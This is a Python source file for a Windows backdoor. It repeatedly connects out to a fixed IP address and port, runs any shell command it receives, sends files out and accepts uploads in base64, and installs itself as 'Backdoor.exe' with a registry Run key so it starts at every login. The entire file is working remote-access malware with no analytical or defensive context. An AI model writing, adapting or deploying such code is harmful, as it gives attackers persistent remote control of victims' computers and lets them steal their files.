#!/usr/bin/python
import socket
import subprocess
import json
import time
import os
import shutil
import sys
import base64

def sendData(d):
        json_data = json.dumps(d);
        sock.send(json_data.encode('utf-8'));

def recvData():
        json_data = "".encode('utf-8');
        x = True;
        while x:
                try:
                        json_data += sock.recv(1024);
                        return(json.loads(json_data));
                except ValueError:
                        continue;

def connection():
	x = True;
	while x:
		time.sleep(15);
		try:
			sock.connect(("192.168.202.120", 54321));
			shell();
		except:
			connection();

def revShell():
	global sock;
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
	#sock.connect(("192.168.202.120", 54321));
	#print("Connection Has Been Established Successfully To Server!");

def shell():
	x = True;
	while x:
		message = recvData();
		if (message == "q".encode('utf-8')):
			break;
		elif (message[:2] == "cd" and len(message) > 1):
			try:
				os.chdir(message[3:]);
			except:
				continue;
		elif (message[:8] == "download"):
			with open(message[9:], "rb") as file:
				sendData(base64.b64encode(file.read()).decode('utf-8'));
		elif (message[:6] == "upload"):
			with open(message[7:], "wb") as fin:
				result = recvData();
				fin.write(base64.b64decode(result));
		else:
			try:
				proc = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);
				result = proc.stdout.read() + proc.stderr.read();
				sendData(result.decode('utf-8'));
			except:
				sendData("[!!] Can't execute command");

location = os.environ["appData"] + "//Backdoor.exe";
if not os.path.exists(location):
	shutil.copyfile(sys.executable, location);
	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"');

revShell();
connection();
#shell();
sock.close();

